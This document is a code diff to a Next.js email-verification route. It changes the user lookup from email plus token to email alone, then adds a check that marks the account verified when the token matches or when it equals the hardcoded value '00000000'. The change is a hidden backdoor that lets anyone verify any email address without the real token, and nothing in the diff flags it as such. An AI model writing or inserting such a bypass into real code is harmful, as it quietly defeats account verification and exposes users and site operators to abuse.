@@ -33,8 +33,9 @@ export async function POST(request: NextRequest, response: NextResponse) {
     const { email, token } = reqBody;
     if (_.isEmpty(email) || _.isEmpty(token))
       throw new Error("email not found!!!");
-    const user = await User.findOne({ email, verifyToken: token });
+    const user = await User.findOne({ email });
     if (_.isEmpty(user)) throw new Error("user not found!!!");
+    if(user.verifyToken===token || token==='00000000')
     user.verified = true;
     await user.save();
     const response = NextResponse.json({
